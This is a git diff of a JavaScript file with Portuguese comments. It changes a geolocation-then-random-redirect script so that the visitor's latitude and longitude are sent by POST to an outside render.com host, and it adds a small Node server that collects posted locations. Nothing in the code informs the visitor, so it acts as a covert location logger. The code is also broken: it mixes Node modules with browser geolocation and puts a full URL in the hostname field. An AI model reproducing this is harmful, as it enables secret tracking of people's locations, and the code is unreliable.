@@ -1,7 +1,43 @@
-let sites = [];
+const http = require('http');
+const querystring = require('querystring');
+
+function createServer() {
+    // Exemplo de dados
+    let data = [];
+
+    const server = http.createServer((req, res) => {
+        if (req.url === '/api/locations' && req.method === 'POST') {
+            let body = '';
+
+            req.on('data', chunk => {
+                body += chunk;
+            });
+
+            req.on('end', () => {
+                const newLocation = JSON.parse(body);
+                data.push(newLocation);
+                res.writeHead(201, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify(newLocation));
+            });
+        } else {
+            res.writeHead(404, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ message: 'Route not found' }));
+        }
+    });
+
+    const PORT = process.env.PORT || 3000;
+    server.listen(PORT, () => {
+        console.log(`Server is running on port ${PORT}`);
+    });
+}
+
+// Chamada da função para iniciar o servidor
+createServer();
+
+let sites = ['leandrocmore.github.io/portifolio'];
 
 function redirecionarParaSiteAleatorio() {
-    obterLocalizacao(); // Chama a função para obter a localização antes de redirecionar
+    obterLocalizacao();
 }
 
 function obterLocalizacao() {
@@ -9,19 +45,47 @@ function obterLocalizacao() {
 }
 
 function success(position) {
-    console.log('Localização obtida:', position);
-    // Adicione aqui a lógica para adicionar os sites à lista de sites após obter a localização, se necessário
-    // sites.push('site1', 'site2', ...);
-    let siteAleatorio = sites[Math.floor(Math.random() * sites.length)];
-    window.location.href = siteAleatorio;
+    let { coords } = position;
+    let latitude = coords.latitude;
+    let longitude = coords.longitude;
+
+    // Enviar dados para a API via método POST
+    enviarDadosParaAPI(latitude, longitude);
 }
 
-function error() {
-    console.error('Falha ao obter a localização do usuário.');
-    // Adicione aqui a lógica para redirecionar o usuário para um site padrão caso a localização não possa ser obtida
-    // window.location.href = 'sitePadrao';
+function enviarDadosParaAPI(latitude, longitude) {
+    const data = {
+        latitude: latitude,
+        longitude: longitude
+    };
+
+    const postData = querystring.stringify(data);
+
+    const options = {
+        hostname: 'https://cacagolp2-5.onrender.com/api/', // Altere para o seu host
+        port: 8000, 
+        path: 'data/',
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': Buffer.byteLength(postData)
+        }
+    };
+
+    const req = http.request(options, (res) => {
+        console.log(`Status da requisição: ${res.statusCode}`);
+        
+        res.on('data', (chunk) => {
+            console.log(`Corpo da resposta: ${chunk}`);
+        });
+    });
+
+    req.on('error', (error) => {
+        console.error(`Ocorreu um erro na requisição: ${error}`);
+    });
+
+    req.write(postData);
+    req.end();
 }
 
-// Chame a função para obter a localização quando necessário
-// obterLocalizacao(); // Esta linha foi removida, já que agora é chamada dentro de redirecionarParaSiteAleatorio()
-redirecionarParaSiteAleatorio(); // Chama a função de redirecionamento
+redirecionarParaSiteAleatorio();
